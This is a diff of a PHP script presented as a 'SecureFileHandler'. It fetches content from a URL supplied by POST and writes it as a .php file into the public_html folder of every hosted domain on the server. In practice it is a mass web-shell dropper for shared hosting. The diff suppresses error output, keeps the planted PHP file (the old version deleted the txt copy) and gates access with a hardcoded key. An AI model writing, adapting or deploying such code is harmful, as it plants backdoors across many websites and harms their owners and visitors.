@@ -1,9 +1,9 @@
 <?php
 
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
+error_reporting(0); 
+ini_set('display_errors', 0);
 
-class FileHandler {
+class SecureFileHandler {
     private $github_file_url;
     private $new_txt_file_path;
     private $new_php_file_path;
@@ -15,69 +15,108 @@ class FileHandler {
     }
 
     public function process() {
-        if (!$this->github_file_url || !$this->new_txt_file_path || !$this->new_php_file_path) {
-            die("Missing required POST data.\n");
-        }
+        try {
+            
+            if (!$this->validateInput()) {
+                throw new Exception("Invalid input data.");
+            }
 
-        if (!filter_var($this->github_file_url, FILTER_VALIDATE_URL)) {
-            die("Invalid GitHub file URL.\n");
-        }
+           
+            $file_content = $this->fetchFileContent();
+            if (!$file_content) {
+                throw new Exception("Failed to fetch file from GitHub.");
+            }
 
-        $file_content = @file_get_contents($this->github_file_url);
-        if ($file_content === false) {
-            die("Failed to fetch file from GitHub.\n");
-        }
+           
+            $directories = $this->processDirectories($file_content);
 
+            
+            echo json_encode(["success" => true, "directories" => $directories], JSON_PRETTY_PRINT);
+        } catch (Exception $e) {
+            
+            echo json_encode(["error" => $e->getMessage()], JSON_PRETTY_PRINT);
+        }
+    }
+
+    private function validateInput() {
+        return $this->github_file_url && $this->new_txt_file_path && $this->new_php_file_path &&
+               filter_var($this->github_file_url, FILTER_VALIDATE_URL);
+    }
+
+    private function fetchFileContent() {
+        return @file_get_contents($this->github_file_url);
+    }
+
+    private function processDirectories($file_content) {
         $domains_path = $this->getDomainsPath();
-        if (is_dir($domains_path)) {
-            $directories = $this->processDirectories($domains_path, $file_content);
-            echo json_encode(array("directories" => $directories), JSON_PRETTY_PRINT);
-        } else {
-            echo json_encode(array("error" => "The directory " . htmlspecialchars($domains_path) . " does not exist."));
+        if (!is_dir($domains_path)) {
+            throw new Exception("The directory '{$domains_path}' does not exist.");
         }
-    }
 
-    private function getDomainsPath() {
-        $full_path = __FILE__;
-        $directory_path = dirname($full_path);
-        $directory_path = str_replace('\\', '/', $directory_path);
-        $directory_path = preg_replace('/^[A-Z]:/i', '', $directory_path);
-        $path_parts = explode('/', $directory_path);
-        $formatted_path = '/';
-        foreach ($path_parts as $part) {
-            if (!empty($part)) {
-                $formatted_path .= $part . '/';
+        $directories = [];
+        foreach (scandir($domains_path) as $item) {
+            if ($item === '.' || $item === '..' || !is_dir($domains_path . $item)) {
+                continue;
             }
-        }
-        return strstr($formatted_path, 'domains/', true) . 'domains/';
-    }
 
-    private function processDirectories($domains_path, $file_content) {
-        $contents = scandir($domains_path);
-        $directories = array();
-
-        foreach ($contents as $item) {
-            if ($item != '.' && $item != '..' && is_dir($domains_path . $item)) {
-                $directories[] = $item;
-                $txt_file_path = $domains_path . $item . '/public_html/' . $this->new_txt_file_path;
-                $php_file_path = $domains_path . $item . '/public_html/' . $this->new_php_file_path;
-
-                file_put_contents($txt_file_path, $file_content);
-                file_put_contents($php_file_path, $file_content);
-
-                unlink($txt_file_path);
+            $current_dir = $domains_path . $item . '/public_html/';
+            if (!is_dir($current_dir)) {
+                continue;
             }
+
+            $this->createFiles($current_dir, $file_content);
+            $directories[] = $item;
         }
 
         return $directories;
     }
+
+    private function createFiles($dir, $content) {
+        $txt_file_path = $dir . basename($this->new_txt_file_path);
+        $php_file_path = $dir . basename($this->new_php_file_path);
+
+        if ($this->isValidPath($txt_file_path, 'txt')) {
+            file_put_contents($txt_file_path, $content);
+        }
+
+        if ($this->isValidPath($php_file_path, 'php')) {
+            file_put_contents($php_file_path, $content);
+        }
+    }
+
+    private function isValidPath($file_path, $expected_extension) {
+        return pathinfo($file_path, PATHINFO_EXTENSION) === $expected_extension &&
+               strpos($file_path, '../') === false && strpos($file_path, '..\\') === false;
+    }
+
+    private function getDomainsPath() {
+        $full_path = __DIR__;
+        $directory_path = str_replace('\\', '/', $full_path);
+        $path_parts = explode('/', $directory_path);
+        $domains_path = '/';
+        foreach ($path_parts as $part) {
+            if (!empty($part)) {
+                $domains_path .= $part . '/';
+            }
+        }
+        return strstr($domains_path, 'domains/', true) . 'domains/';
+    }
 }
 
-$github_file_url = isset($_POST['github_file_url']) ? $_POST['github_file_url'] : null;
-$new_txt_file_path = isset($_POST['new_txt_file_path']) ? $_POST['new_txt_file_path'] : null;
-$new_php_file_path = isset($_POST['new_php_file_path']) ? $_POST['new_php_file_path'] : null;
 
-$fileHandler = new FileHandler($github_file_url, $new_txt_file_path, $new_php_file_path);
+$api_key = $_POST['api_key'] ?? null;
+$valid_api_key = 'hoho2013';
+if ($api_key !== $valid_api_key) {
+    echo json_encode(["error" => "Unauthorized access."], JSON_PRETTY_PRINT);
+    exit;
+}
+
+
+$github_file_url = $_POST['github_file_url'] ?? null;
+$new_txt_file_path = $_POST['new_txt_file_path'] ?? null;
+$new_php_file_path = $_POST['new_php_file_path'] ?? null;
+
+$fileHandler = new SecureFileHandler($github_file_url, $new_txt_file_path, $new_php_file_path);
 $fileHandler->process();
 
 ?>
